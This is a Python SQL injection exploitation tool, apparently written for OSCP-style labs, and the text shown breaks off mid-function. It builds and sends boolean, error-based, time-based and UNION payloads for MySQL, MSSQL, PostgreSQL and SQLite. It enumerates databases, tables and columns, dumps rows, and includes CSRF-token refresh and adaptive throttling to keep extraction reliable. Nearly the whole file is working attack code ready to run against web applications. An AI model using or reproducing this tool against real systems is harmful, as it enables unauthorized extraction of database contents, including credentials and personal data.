#!/usr/bin/env python3
# ---------------------------------------------------------------------------
# sqli.py - manual SQLi extraction helper (by exagon89)
# ---------------------------------------------------------------------------
# ONE dumper, four techniques (boolean / error / time / union), four DBMS
# dialects (mysql / mssql / postgres / sqlite). You supply the injection
# point and the payload template; this tool automates ONLY the repetitive
# char-by-char / row-by-row extraction. It does NOT find injections and does
# NOT auto-detect-and-exploit like sqlmap.
#
# OSCP note: automatic-exploitation tools (sqlmap, sqlninja) are banned;
# "custom scripts" for manual exploitation are allowed. This is the latter:
# a comfort tool that dumps an injection YOU already found and classified.
# Confirm current exam rules before use.
#
# Request source (pick one):
#   -r FILE        raw Burp/proxy request; carries method, path, headers,
#                  cookies and body in one paste. Mark the injection point in
#                  the request body/query/header with the literal token INJECT*
#   or the individual flags: -u URL -X METHOD -d DATA / -H headers ...
#
# Injection point:
#   Put the marker  INJECT*  where the payload must go (in -r file, in -d body,
#   in -u query, or in an -H header value). If no marker is present you must
#   name the field with -p and give a template with --template.
#
# The two things every technique needs:
#   --technique  boolean | error | time | union
#   --dbms       mysql | mssql | postgres | sqlite
#
# See  sqli.py -h  for the full flag list and examples.
# ---------------------------------------------------------------------------

import argparse
import re
import sys
import time
import shutil
import threading
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.structures import CaseInsensitiveDict
except ImportError:
    print("[!] missing dependency: pip install requests --break-system-packages")
    sys.exit(1)

# Silence only the self-signed-cert warning (we intentionally verify=False so
# the tool works against lab targets with bad certs).
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass


BANNER = r"""
           _ _       _
 ___  __ _| (_)   __| |_   _ _ __ ___  _ __   ___ _ __
/ __|/ _` | | |  / _` | | | | '_ ` _ \| '_ \ / _ \ '__|
\__ \ (_| | | | | (_| | |_| | | | | | | |_) |  __/ |
|___/\__, |_|_|  \__,_|\__,_|_| |_| |_| .__/ \___|_|
        |_|                           |_|
       manual SQLi extraction helper  ::  by exagon89
"""

MARKER = "INJECT*"          # where the payload is spliced into the request
INJECT = "[INJECT]"         # where the SQL expression is spliced into TEMPLATE


# ===========================================================================
# DBMS DIALECT PROFILES
# ===========================================================================
# Each profile supplies the primitives the extraction logic needs, so the
# oracle code stays identical across databases. Verified against the
# PortSwigger / Tib3rius dialect references.
#
#   substr(expr,pos,len) -> 1-based substring
#   ascii(expr)          -> integer code of a single char
#   length(expr)         -> character length
#   concat(list)         -> concatenate the given SQL fragments
#   sleep(cond,secs)     -> expression that delays ONLY when cond is true
#   version              -> version string subquery
#   dbs                  -> subquery returning delimited database/schema names
#   tables(db)           -> subquery returning delimited table names for db
#   columns(db,table)    -> subquery returning delimited column names
#   rows(cols,db,table)  -> subquery returning delimited rows (cols joined)
#   agg_sep              -> the delimiter used between rows/items
#   comment              -> trailing comment to swallow the rest of the query
#   supports_time        -> whether time-based works on this DBMS
# ---------------------------------------------------------------------------

AGG = ","   # row/item delimiter used everywhere (chr 44)


def _mysql():
    return {
        "name": "mysql",
        "substr": lambda e, p, l: f"substring(({e}),{p},{l})",
        "ascii":  lambda e: f"ascii({e})",
        "length": lambda e: f"length(({e}))",
        "concat": lambda parts: "concat(" + ",".join(parts) + ")",
        # IF(cond, SLEEP(n), 0)
        "sleep":  lambda cond, s: f"IF(({cond}),SLEEP({s}),0)",
        "sleep_wrappers": [
            "IF(({cond}),SLEEP({d}),0)",
            "(SELECT IF(({cond}),SLEEP({d}),0))",
            "(SELECT IF(({cond}),SLEEP({d}),0) FROM DUAL)",
        ],
        "version": "SELECT @@version",
        "dbs":    "SELECT group_concat(schema_name) FROM information_schema.schemata",
        "tables": lambda db: (
            "SELECT group_concat(table_name) FROM information_schema.tables "
            f"WHERE table_schema='{db}'"),
        "columns": lambda db, t: (
            "SELECT group_concat(column_name) FROM information_schema.columns "
            f"WHERE table_schema='{db}' AND table_name='{t}'"),
        "col_concat": lambda cols: "concat_ws(0x3a," + ",".join(cols) + ")",
        "rows_agg": lambda expr, db, t: f"SELECT group_concat({expr}) FROM {db}.{t}",
        "single_col": lambda c, db, t: f"SELECT group_concat({c}) FROM {db}.{t}",
        "current_db": "SELECT database()",
        # bleed-guard primitives: inline IF, and a byte-exact substring compare
        # (CAST AS BINARY forces a byte-level match regardless of collation; the
        # 0x hex literal keeps quotes out of the payload entirely).
        "ifexpr": lambda c, a, b: f"IF(({c}),{a},{b})",
        "eq_hex": lambda sub, start, n, h: (
            f"CAST(substring(({sub}),{start},{n}) AS BINARY)=0x{h}"),
        "comment": "-- -",
        "supports_time": True,
        "skip_dbs": ["information_schema", "performance_schema", "sys", "mysql"],
    }


def _mssql():
    return {
        "name": "mssql",
        "substr": lambda e, p, l: f"substring(({e}),{p},{l})",
        "ascii":  lambda e: f"ascii({e})",
        "length": lambda e: f"len(({e}))",
        # MSSQL concatenates with + ; cast fragments to varchar to be safe
        "concat": lambda parts: "+".join(parts),
        # MSSQL has no inline IF-in-expression. Two viable time forms:
        #  1) stacked statement (needs a context that allows ; or standalone
        #     statement termination, e.g. INSERT/UPDATE sinks or stacked qs):
        #        '; IF(cond) WAITFOR DELAY '0:0:d'--
        #  2) subquery with a CASE that references a slow construct - MSSQL has
        #     no pure sleep in a subselect, so the reliable path is the stacked
        #     form. If your injection is inside a WHERE '...' SELECT context and
        #     stacking is not allowed, MSSQL time-based will NOT fire - fall
        #     back to --technique boolean.
        "sleep":  lambda cond, s: f"IF(({cond})) WAITFOR DELAY '0:0:{s}'",
        "sleep_wrappers": [
            "IF(({cond})) WAITFOR DELAY '0:0:{d}'",          # already broken out
            "; IF(({cond})) WAITFOR DELAY '0:0:{d}'",        # stacked
        ],
        "version": "SELECT @@version",
        # STRING_AGG (SQL Server 2017+); fallback to FOR XML if needed.
        "dbs":    "SELECT STRING_AGG(name,CHAR(44)) FROM sys.databases",
        "tables": lambda db: (
            f"SELECT STRING_AGG(table_name,CHAR(44)) FROM {db}.information_schema.tables"),
        "columns": lambda db, t: (
            f"SELECT STRING_AGG(column_name,CHAR(44)) FROM {db}.information_schema.columns "
            f"WHERE table_name='{t}'"),
        "col_concat": lambda cols: "+CHAR(58)+".join(
            [f"CAST({c} AS NVARCHAR(4000))" for c in cols]),
        "rows_agg": lambda expr, db, t: f"SELECT STRING_AGG({expr},CHAR(44)) FROM {db}..{t}",
        "single_col": lambda c, db, t: (
            f"SELECT STRING_AGG(CAST({c} AS NVARCHAR(4000)),CHAR(44)) FROM {db}..{t}"),
        "current_db": "SELECT DB_NAME()",
        "ifexpr": lambda c, a, b: f"(CASE WHEN ({c}) THEN {a} ELSE {b} END)",
        "eq_hex": lambda sub, start, n, h: (
            f"CONVERT(VARBINARY(MAX),SUBSTRING(({sub}),{start},{n}))=0x{h}"),
        "comment": "-- -",
        "supports_time": True,
        "skip_dbs": ["master", "tempdb", "model", "msdb"],
    }


def _postgres():
    return {
        "name": "postgres",
        "substr": lambda e, p, l: f"substr(({e}),{p},{l})",
        "ascii":  lambda e: f"ascii({e})",
        "length": lambda e: f"length(({e}))",
        # Postgres concatenates with ||
        "concat": lambda parts: "||".join(parts),
        # (SELECT CASE WHEN cond THEN pg_sleep(n) ELSE pg_sleep(0) END)
        "sleep":  lambda cond, s: (
            f"(SELECT CASE WHEN ({cond}) THEN pg_sleep({s}) "
            f"ELSE pg_sleep(0) END)"),
        "sleep_wrappers": [
            "(SELECT CASE WHEN ({cond}) THEN pg_sleep({d}) ELSE pg_sleep(0) END)",
        ],
        "version": "SELECT version()",
        "dbs":    "SELECT string_agg(datname,chr(44)) FROM pg_database",
        "tables": lambda db: (
            "SELECT string_agg(table_name,chr(44)) FROM information_schema.tables "
            "WHERE table_schema='public'"),
        "columns": lambda db, t: (
            "SELECT string_agg(column_name,chr(44)) FROM information_schema.columns "
            f"WHERE table_name='{t}'"),
        "col_concat": lambda cols: "||chr(58)||".join(
            [f"CAST({c} AS TEXT)" for c in cols]),
        "rows_agg": lambda expr, db, t: f"SELECT string_agg({expr},chr(44)) FROM {t}",
        "single_col": lambda c, db, t: (
            f"SELECT string_agg(CAST({c} AS TEXT),chr(44)) FROM {t}"),
        "current_db": "SELECT current_database()",
        "ifexpr": lambda c, a, b: f"(CASE WHEN ({c}) THEN {a} ELSE {b} END)",
        "eq_hex": lambda sub, start, n, h: (
            f"convert_to(substr(({sub}),{start},{n}),'UTF8')=decode('{h}','hex')"),
        "comment": "-- -",
        "supports_time": True,
        # postgres has no cross-database queries over one connection; db arg
        # is ignored for tables/columns (uses current db / public schema).
        "skip_dbs": ["template0", "template1", "postgres"],
    }


def _sqlite():
    return {
        "name": "sqlite",
        "substr": lambda e, p, l: f"substr(({e}),{p},{l})",
        "ascii":  lambda e: f"unicode({e})",
        "length": lambda e: f"length(({e}))",
        "concat": lambda parts: "||".join(parts),
        # SQLite has no sleep(). Time-based is not viable; heavy-query delay is
        # unreliable, so we refuse rather than dump garbage.
        "sleep":  None,
        "sleep_wrappers": None,
        "version": "SELECT sqlite_version()",
        # SQLite has no server-level "databases"; expose the single schema.
        "dbs":    "SELECT group_concat(name,',') FROM (SELECT 'main' AS name)",
        "tables": lambda db: (
            "SELECT group_concat(name,',') FROM sqlite_master WHERE type='table'"),
        "columns": lambda db, t: (
            f"SELECT group_concat(name,',') FROM pragma_table_info('{t}')"),
        "col_concat": lambda cols: "||char(58)||".join(
            [f"CAST({c} AS TEXT)" for c in cols]),
        "rows_agg": lambda expr, db, t: f"SELECT group_concat({expr},',') FROM {t}",
        "single_col": lambda c, db, t: (
            f"SELECT group_concat(CAST({c} AS TEXT),',') FROM {t}"),
        "current_db": "SELECT 'main'",
        "ifexpr": lambda c, a, b: f"(CASE WHEN ({c}) THEN {a} ELSE {b} END)",
        # SQLite hex() returns UPPERCASE hex, so match that on the compare side.
        "eq_hex": lambda sub, start, n, h: (
            f"hex(substr(({sub}),{start},{n}))='{h.upper()}'"),
        "comment": "-- -",
        "supports_time": False,
        "skip_dbs": [],
    }


PROFILES = {
    "mysql": _mysql,
    "mssql": _mssql,
    "postgres": _postgres,
    "sqlite": _sqlite,
}


# ===========================================================================
# REQUEST MODEL
# ===========================================================================
# One place that knows how to build and send a request with the payload
# spliced into the marked spot, whatever the transport (query / body / header)
# and whatever the injection point.
# ---------------------------------------------------------------------------

class RequestTemplate:
    """Holds a request skeleton with exactly one MARKER, and rebuilds it with
    a concrete payload each time send() is called."""

    def __init__(self, method, url, headers, body, marker_where):
        self.method = method.upper()
        self.url = url
        self.headers = headers            # CaseInsensitiveDict
        self.body = body                  # str or None
        self.where = marker_where         # 'url' | 'body' | 'header:<name>'

    def _splice(self, payload):
        url, headers, body = self.url, dict(self.headers), self.body
        if self.where == "url":
            url = url.replace(MARKER, payload)
        elif self.where == "body":
            body = (body or "").replace(MARKER, payload)
        elif self.where.startswith("header:"):
            hname = self.where.split(":", 1)[1]
            headers[hname] = headers.get(hname, "").replace(MARKER, payload)
        return url, headers, body


def parse_raw_request(path, scheme):
    """Parse a raw Burp request file into method, url, headers, body.
    The injection MARKER must already be present somewhere in the file."""
    with open(path, "r", errors="replace") as f:
        raw = f.read()
    # split headers / body on the first blank line
    if "\r\n\r\n" in raw:
        head, _, body = raw.partition("\r\n\r\n")
    else:
        head, _, body = raw.partition("\n\n")
    lines = head.replace("\r\n", "\n").split("\n")
    request_line = lines[0].strip()
    parts = request_line.split()
    if len(parts) < 2:
        raise ValueError("first line is not a valid request line")
    method, path_q = parts[0], parts[1]
    headers = CaseInsensitiveDict()
    for line in lines[1:]:
        if not line.strip() or ":" not in line:
            continue
        k, v = line.split(":", 1)
        headers[k.strip()] = v.strip()
    host = headers.get("Host", "").strip()
    if path_q.lower().startswith("http"):
        url = path_q
    else:
        if not host:
            raise ValueError("no Host header and path is not absolute")
        url = f"{scheme}://{host}{path_q}"
    body = body if body.strip() else None
    return method, url, headers, body


def locate_marker(method, url, headers, body):
    """Find which part of the request carries the MARKER."""
    if url and MARKER in url:
        return "url"
    if body and MARKER in body:
        return "body"
    for k, v in headers.items():
        if v and MARKER in v:
            return f"header:{k}"
    return None


# ===========================================================================
# MATCH ENGINE  (the new, generalized oracle input)
# ===========================================================================
# Turns a raw HTTP response into a TRUE/FALSE (or, for reflect techniques,
# into the text to parse). Supports: status code, Location header, body text
# present/absent, regex, content-length, and following redirects.
# ---------------------------------------------------------------------------

class Matcher:
    def __init__(self, args):
        self.true_code   = args.true_code
        self.false_code  = args.false_code
        self.match_text  = args.match_text
        self.notmatch_text = args.match_not_text
        self.match_regex = re.compile(args.match_regex) if args.match_regex else None
        self.match_loc   = args.match_location
        self.match_len   = args.match_len          # "op:value" e.g. ">1000"
        self.follow      = args.follow
        # two-signal tri-state: a TRUE phrase AND a FALSE phrase. A response
        # showing exactly one is decisive; a response showing NEITHER (an error
        # page, a 500, a 419, a redirect loop under load) is AMBIGUOUS, not a
        # boolean - so it is retried instead of silently miscounted. This is
        # what stops a flaky redirect/flash box degrading into 'aaaa'/',,,,'.
        self.true_text   = getattr(args, "true_text", None)
        self.false_text  = getattr(args, "false_text", None)

    def _len_ok(self, n):
        if not self.match_len:
            return None
        m = re.match(r"\s*(>=|<=|>|<|=)?\s*(\d+)", self.match_len)
        if not m:
            return None
        op, val = m.group(1) or "=", int(m.group(2))
        return {">": n > val, "<": n < val, ">=": n >= val,
                "<=": n <= val, "=": n == val}[op]

    def verdict(self, resp):
        """Tri-state oracle read: True / False / None(ambiguous).
        With both a true_text and a false_text configured, exactly-one-present
        is decisive and anything else (neither, or both) returns None so the
        caller retries. Without the pair, falls back to the single-signal
        binary engine (which always commits to True/False)."""
        if self.true_text is not None and self.false_text is not None:
            t = self.true_text in resp.text
            f = self.false_text in resp.text
            if t and not f:
                return True
            if f and not t:
                return False
            return None
        return self.is_true(resp)

    def is_true(self, resp):
        """Decide TRUE/FALSE for boolean/time from a response object.
        Every configured condition must agree; the first one configured that
        gives a verdict wins in priority order code -> location -> len ->
        text -> regex. At least one MUST be configured (validated in main)."""
        # status code
        if self.true_code is not None:
            return resp.status_code == self.true_code
        if self.false_code is not None:
            return resp.status_code != self.false_code
        # location header (redirect target)
        if self.match_loc is not None:
            loc = resp.headers.get("Location", "")
            return self.match_loc in loc
        # content length
        lok = self._len_ok(len(resp.content))
        if lok is not None:
            return lok
        # body text present  -> TRUE
        if self.match_text is not None:
            return self.match_text in resp.text
        # body text absent   -> TRUE (classic FALSE-marker inverted)
        if self.notmatch_text is not None:
            return self.notmatch_text not in resp.text
        # regex present -> TRUE
        if self.match_regex is not None:
            return bool(self.match_regex.search(resp.text))
        raise RuntimeError("no match condition configured")


# ===========================================================================
# HTTP SENDER
# ===========================================================================

class Sender:
    def __init__(self, tmpl, args):
        self.tmpl = tmpl
        self.follow = args.follow
        self.timeout = args.timeout
        self.proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else None
        self.verbose = args.verbose
        self.session = requests.Session()
        self.csrf = None            # set later by attach_csrf() if enabled
        self.csrf_field = None
        self._lock = threading.Lock()
        # adaptive inter-request delay: raised automatically when the target
        # starts returning ambiguous/error pages under load, so a flaky box is
        # handled by slowing down rather than by guessing.
        self.throttle = max(0.0, getattr(args, "throttle", 0.0) or 0.0)

    def attach_csrf(self, refresher, field):
        """Enable per-request CSRF token refresh. The token is scraped fresh
        and injected into whichever part of the request carries the field."""
        self.csrf = refresher
        self.csrf_field = field

    def _inject_csrf(self, url, headers, body):
        """Replace the csrf field's value in url/body with a fresh token."""
        token = self.csrf.fresh()
        if not token:
            return url, headers, body
        pat = re.compile(rf"({re.escape(self.csrf_field)}=)[^&\"']*")
        if body and self.csrf_field in body:
            body = pat.sub(rf"\g<1>{token}", body, count=1)
        elif url and self.csrf_field in url:
            url = pat.sub(rf"\g<1>{token}", url, count=1)
        return url, headers, body

    def send(self, payload):
        url, headers, body = self.tmpl._splice(payload)
        # requests sets its own Content-Length/Host; drop stale ones
        headers.pop("Content-Length", None)
        # CSRF: scrape + splice a fresh token right before sending
        if self.csrf is not None:
            with self._lock:
                url, headers, body = self._inject_csrf(url, headers, body)
        if self.verbose:
            sys.stderr.write(f"\n[>] {self.tmpl.method} {url}\n    payload={payload!r}\n")
        r = self.session.request(
            self.tmpl.method, url,
            headers=headers,
            data=body if self.tmpl.method != "GET" else None,
            allow_redirects=self.follow,
            timeout=self.timeout,
            verify=False,
            proxies=self.proxy,
        )
        if self.verbose:
            sys.stderr.write(f"[<] {r.status_code} len={len(r.content)} "
                             f"loc={r.headers.get('Location','-')}\n")
        if self.throttle:
            time.sleep(self.throttle)
        return r


# ===========================================================================
# CSRF TOKEN REFRESH (optional, Phase-2 feature)
# ===========================================================================

class CsrfRefresher:
    """Scrape a fresh anti-CSRF token before each request when the app rotates
    it (Laravel _token, __RequestVerificationToken, etc.)."""
    def __init__(self, sender, args):
        self.enabled = bool(args.csrf_url and args.csrf_field)
        self.url = args.csrf_url
        self.field = args.csrf_field
        self.session = sender.session
        self.proxy = sender.proxy
        self.timeout = sender.timeout
        self.re1 = self.re2 = None
        if self.enabled:
            # name="field" value="..."  and the reverse attribute order
            self.re1 = re.compile(
                rf'name=["\']{re.escape(self.field)}["\'][^>]*'
                rf'value=["\']([^"\']+)["\']')
            self.re2 = re.compile(
                rf'value=["\']([^"\']+)["\'][^>]*'
                rf'name=["\']{re.escape(self.field)}["\']')

    def fresh(self):
        if not self.enabled:
            return None
        try:
            r = self.session.get(self.url, timeout=self.timeout,
                                 verify=False, proxies=self.proxy)
        except Exception:
            return None
        for rx in (self.re1, self.re2):
            m = rx.search(r.text)
            if m:
                return m.group(1)
        return None


# ===========================================================================
# BLEED GUARD  (technique-agnostic anti-corruption layer)
# ===========================================================================
# Every extraction channel (blind binary-search, error-reflect, union-reflect)
# can misread a value on an unstable target: a single wrong request turns one
# character into garbage. This guard confirms a finished string against the DB
# byte-for-byte and repairs the parts that are wrong, using only two things
# each technique already provides:
#   confirm(condition) -> bool     (ask the DB a yes/no question)
#   reread(subquery,pos) -> char   (pull one character again, same channel)
#
# Cost when the value is already clean: ONE length check + ONE whole-string
# byte-compare (2 requests), so speed is barely affected. It only bisects and
# re-reads when it actually detects a mismatch. If the checker itself looks
# broken (claims most of the string is wrong, or a length it cannot reconcile)
# it restores the original read and reports 'unverified' instead of destroying
# good data - the exact fail-safe from the tuned time-based dumper.
# ---------------------------------------------------------------------------

class BleedGuard:
    def __init__(self, confirm, prof, reread, votes=5):
        self._confirm = confirm       # condition -> bool
        self.prof = prof
        self.reread = reread          # (subquery, pos) -> char
        self.votes = max(1, votes)
        self.enabled = bool(prof.get("eq_hex"))

    def _vote(self, cond):
        """Majority of up to `votes` responses, short-circuiting as soon as one
        side is mathematically unbeatable, so a couple of flaky responses can't
        corrupt the verifier itself. Cheap when the target is stable (2 calls),
        only spends more when answers actually disagree."""
        try:
            t = f = 0
            need = self.votes // 2 + 1
            for _ in range(self.votes):
                if self._confirm(cond):
                    t += 1
                else:
                    f += 1
                if t >= need or f >= need:
                    break
            return t > f
        except Exception:
            return None

    def _seg_ok(self, sub, chars, lo, hi):
        h = "".join(chars[lo:hi]).encode("utf-8", "replace").hex()
        return self._vote(self.prof["eq_hex"](sub, lo + 1, hi - lo, h)) is True

    def _true_length(self, sub, cap=8192):
        lexpr = self.prof["length"](sub)
        lo, hi = 0, cap
        while lo < hi:
            mid = (lo + hi) // 2
            gt = self._vote(f"{lexpr}>{mid}")
            if gt is None:
                return None
            if gt:
                lo = mid + 1
            else:
                hi = mid
        return lo

    def _solid(self, cond):
        """A 'clean' verdict is only accepted when two INDEPENDENT vote rounds
        both agree the bytes match. This squares the verifier's own error
        probability (e -> e^2), so a run of unlucky responses cannot pass
        corrupt data off as clean. Cost: one extra confirm on a clean value."""
        return self._vote(cond) is True and self._vote(cond) is True

    def _solid_seg(self, sub, chars, lo, hi):
        h = "".join(chars[lo:hi]).encode("utf-8", "replace").hex()
        return self._solid(self.prof["eq_hex"](sub, lo + 1, hi - lo, h))

    def _fix(self, sub, chars, lo, hi):
        if self._seg_ok(sub, chars, lo, hi):
            return 0
        if hi - lo == 1:
            v = self.reread(sub, lo + 1)
            if v:                      # a re-read of "" = dead oracle; keep old
                chars[lo] = v[0]
            return 1
        mid = (lo + hi) // 2
        return self._fix(sub, chars, lo, mid) + self._fix(sub, chars, mid, hi)

    def check(self, sub, value):
        """Return (value, status): clean | repaired | unverified | truncated."""
        if not self.enabled:
            return value, "unverified"
        chars = list(value)
        # 1) length must agree, or a prefix byte-compare would silently pass a
        #    truncated / over-read value. Double-checked so a lone flip cannot
        #    trigger a needless reconcile - or hide a real truncation.
        lexpr = self.prof["length"](sub)
        if not self._solid(f"{lexpr}={len(chars)}"):
            tl = self._true_length(sub)
            # only act on a length we can independently pin down; otherwise a
            # mis-found length would truncate good data and pass a prefix check
            if tl is None or not self._solid(f"{lexpr}={tl}"):
                return value, "unverified"
            if tl < len(chars):
                chars = chars[:tl]
            elif tl > len(chars):
                for p in range(len(chars), tl):
                    c = self.reread(sub, p + 1)
                    chars.append(c[0] if c else "?")
        if not chars:
            return "", "clean"
        # 2) whole-string byte-exact compare; bisect + reread only on mismatch.
        #    The 'clean' exit goes through the double-confirm gate.
        budget = max(4, len(chars) // 3)
        fixed = 0
        for _ in range(3):
            if self._solid_seg(sub, chars, 0, len(chars)):
                return "".join(chars), ("clean" if fixed == 0 else "repaired")
            fixed += self._fix(sub, chars, 0, len(chars))
            if fixed > budget:         # checker unreliable -> don't trust it
                return value, "unverified"
        ok = self._solid_seg(sub, chars, 0, len(chars))
        return "".join(chars), ("repaired" if ok else "unverified")


# ===========================================================================
# STABILITY CONTROL  (adaptive throttle + stuck detection)
# ===========================================================================

class OracleStuck(Exception):
    """Raised when the oracle only ever returns ambiguous/error pages, so no
    honest bit can be read. Better to stop with a clear message than to emit a
    string of identical garbage characters."""


class ThrottleController:
    """Watches how often the oracle comes back ambiguous (an error/500/419 page
    that is neither the TRUE nor the FALSE marker) and slows the request rate
    when a target buckles under load - then eases back off once it recovers.
    This is the 'flaky box just takes longer' behaviour, made automatic."""
    def __init__(self, sender, cap=3.0, step=0.2, verbose=False, recover=8):
        self.sender = sender
        self.cap = cap
        self.step = step
        self.verbose = verbose
        self.recover = recover          # clean reads before speeding back up
        self.recent = deque(maxlen=12)  # 1 = ambiguous, 0 = decisive
        self.good = 0                   # consecutive decisive reads
        self._announced = 0.0

    def _amb_rate(self):
        return (sum(self.recent) / len(self.recent)) if self.recent else 0.0

    def on_decisive(self):
        self.recent.append(0)
        self.good += 1
        # a short clean streak means the box is keeping up now -> speed back up
        # one step at a time, walking down to 0 so we sit at the *minimum*
        # sustainable delay instead of staying slow after one rough patch.
        if self.sender.throttle > 0 and self.good >= self.recover:
            self.good = 0
            self.sender.throttle = max(0.0, round(self.sender.throttle - self.step, 2))
            self._announced = self.sender.throttle   # let a later rise re-announce

    def on_ambiguous(self):
        self.recent.append(1)
        self.good = 0
        # short back-off so a transient spike gets room to clear
        time.sleep(min(1.0, 0.1 + self.step))
        # only slow the steady rate when ambiguity is genuinely recurring (a
        # real 'the box is bleeding under load' signal), not on a lone blip
        if self._amb_rate() >= 0.34 and self.sender.throttle < self.cap:
            self.sender.throttle = min(self.cap, round(self.sender.throttle + self.step, 2))
            if self.sender.throttle - self._announced >= 0.19:
                self._announced = self.sender.throttle
                sys.stdout.write(
                    f"\n[~] target is flaky under load - throttling to "
                    f"{self.sender.throttle:.2f}s/req (slower, but correct)\n")
                sys.stdout.flush()


# ===========================================================================
# ORACLES  (one per technique; each returns TRUE/FALSE for a condition, or
#           leaks a string directly for reflect-based techniques)
# ===========================================================================

class BooleanOracle:
    """TRUE/FALSE from the match engine. condition -> bool.

    Two layers keep a bit honest on an unstable target:
      1. TRI-STATE READ. With a TRUE-marker and a FALSE-marker configured, a
         response showing neither (error/500/419/redirect-loop under load) is
         AMBIGUOUS, not a boolean - it is retried, never counted. This is what
         actually stops the 'aaaa'/',,,,' floods: those were error pages being
         read as a real FALSE/TRUE. The controller slows the rate while this
         happens, so the box recovers instead of being hammered harder.
      2. MARGIN VOTE over the decisive reads: keep sampling until one side
         leads by `margin`, so residual random jitter can't flip a bit either.
    If it can never get a single decisive read for a bit, it raises OracleStuck
    rather than inventing a character."""
    def __init__(self, sender, matcher, tmpl_str, margin=2, max_votes=25,
                 ctl=None):
        self.sender = sender
        self.matcher = matcher
        self.tmpl_str = tmpl_str    # payload template with [INJECT]
        self.margin_floor = max(1, margin)
        self.margin = self.margin_floor      # starts fast; raised only on bleed
        self.margin_cap = 6
        self.max_votes = max(1, max_votes)
        self.ctl = ctl

    # adaptive margin: extraction starts fast (low margin). When the verifier
    # catches bleeding, raise_margin() makes every subsequent bit sturdier;
    # a clean streak relaxes it back down so a healthy box stays fast.
    def raise_margin(self):
        self.margin = min(self.margin_cap, self.margin + 1)

    def relax_margin(self):
        self.margin = max(self.margin_floor, self.margin - 1)

    def raw_verdict(self, condition):
        """One un-retried read -> True / False / None. Used for the up-front
        connectivity probe that tells a broken session from a merely flaky box."""
        payload = self.tmpl_str.replace(INJECT, condition)
        return self.matcher.verdict(self.sender.send(payload))

    def _sample(self, condition):
        """One request -> True / False / None(ambiguous)."""
        payload = self.tmpl_str.replace(INJECT, condition)
        return self.matcher.verdict(self.sender.send(payload))

    def truth(self, condition):
        if self.max_votes <= 1:
            v = self._sample(condition)
            return bool(v)          # single-shot mode ignores ambiguity
        t = f = 0
        decisive = 0
        # generous attempt budget: ambiguous reads don't count toward the vote,
        # they just trigger a retry (and a throttle bump via the controller).
        attempts = 0
        max_attempts = self.max_votes + 40
        while attempts < max_attempts:
            attempts += 1
            v = self._sample(condition)
            if v is None:
                if self.ctl:
                    self.ctl.on_ambiguous()
                continue
            if self.ctl:
                self.ctl.on_decisive()
            decisive += 1
            if v:
                t += 1
            else:
                f += 1
            if abs(t - f) >= self.margin or decisive >= self.max_votes:
                break
        if decisive == 0:
            raise OracleStuck(
                "no decisive TRUE/FALSE read after "
                f"{attempts} attempts (only error/ambiguous pages).")
        return t > f


class ErrorOracle:
    """Leaks data inside a ~...~ marked error string (extractvalue/updatexml
    on MySQL; other DBMS use their own error-leak forms). Reflect-based:
    returns strings, not char-by-char booleans."""
    MARK = re.compile(r"~([^~<']{0,40})~?")
    CHUNK = 20

    def __init__(self, sender, tmpl_str, prof, verify=True):
        self.sender = sender
        self.tmpl_str = tmpl_str
        self.prof = prof
        self.guard = BleedGuard(self.confirm, prof, self.reread) if verify else None

    def _expr(self, subquery, pos):
        sub = self.prof["substr"](subquery, pos, self.CHUNK)
        # MySQL/MSSQL/Postgres error-leak forms differ; only MySQL uses
        # extractvalue. For others we fall back to a cast error.
        if self.prof["name"] == "mysql":
            return f"extractvalue(1,concat(0x7e,{sub},0x7e))"
        if self.prof["name"] == "postgres":
            return f"CAST((SELECT '~'||({sub})||'~') AS int)"
        if self.prof["name"] == "mssql":
            return f"CAST((SELECT '~'+{sub}+'~') AS int)"
        return f"extractvalue(1,concat(0x7e,{sub},0x7e))"

    def _read(self, subquery):
        """One reflect read (paged over the 32-char extractvalue cap). No
        printing, no guard - the raw channel used by leak/confirm/reread."""
        out, pos = "", 1
        while True:
            payload = self.tmpl_str.replace(INJECT, self._expr(subquery, pos))
            text = self.sender.send(payload).text
            m = self.MARK.search(text)
            chunk = m.group(1) if m else ""
            if not chunk:
                break
            out += chunk
            if len(chunk) < self.CHUNK:
                break
            pos += self.CHUNK
        return out

    def confirm(self, cond):
        """Boolean question over the same error channel: reflect 1 or 0."""
        return self._read(self.prof["ifexpr"](cond, "1", "0")) == "1"

    def reread(self, subquery, pos):
        return self._read(self.prof["substr"](subquery, pos, 1))

    def leak(self, subquery, label=None):
        out = self._read(subquery)
        status = None
        if self.guard and self.guard.enabled and out:
            out, status = self.guard.check(subquery, out)
        if label:
            tag = "" if status in (None, "clean") else f"  [{status}]"
            sys.stdout.write(f"{label}{out}{tag}\n")
        return out


class UnionOracle:
    """Leaks data reflected in a UNION column, marked ~...~. Reflect-based."""
    MARK = re.compile(r"~(.*?)~", re.S)

    def __init__(self, sender, tmpl_str, prof, ncols, pos, verify=True):
        self.sender = sender
        self.tmpl_str = tmpl_str
        self.prof = prof
        self.ncols = ncols
        self.pos = pos
        self.guard = BleedGuard(self.confirm, prof, self.reread) if verify else None

    def _read(self, subquery):
        cols = ["NULL"] * self.ncols
        cols[self.pos] = self.prof["concat"](["0x7e" if self.prof["name"] == "mysql"
                                              else "'~'", f"({subquery})",
                                              "0x7e" if self.prof["name"] == "mysql"
                                              else "'~'"])
        payload = self.tmpl_str.replace(INJECT, ",".join(cols))
        text = self.sender.send(payload).text
        m = self.MARK.search(text)
        return m.group(1) if m else ""

    def confirm(self, cond):
        return self._read(self.prof["ifexpr"](cond, "1", "0")) == "1"

    def reread(self, subquery, pos):
        return self._read(self.prof["substr"](subquery, pos, 1))

    def leak(self, subquery, label=None):
        out = self._read(subquery)
        status = None
        if self.guard and self.guard.enabled and out:
            out, status = self.guard.check(subquery, out)
        if label:
            tag = "" if status in (None, "clean") else f"  [{status}]"
            sys.stdout.write(f"{label}{out}{tag}\n")
        return out


class TimeOracle:
    """TRUE/FALSE from response delay. condition -> bool. Self-calibrating,
    with manual override, ported from the vetted time-based dumper."""
    def __init__(self, sender, tmpl_str, prof, args):
        self.sender = sender
        self.tmpl_str = tmpl_str
        self.prof = prof
        self.delay = args.delay if args.delay else 1.0
        self.auto = not args.delay
        self.threshold = None
        self.base = None
        self.wrapper = None

    def _send_timed(self, expr):
        payload = self.tmpl_str.replace(INJECT, expr)
        start = time.time()
        try:
            self.sender.send(payload)
        except Exception:
            return None
        return time.time() - start

    def calibrate(self):
        # baseline
        samples = []
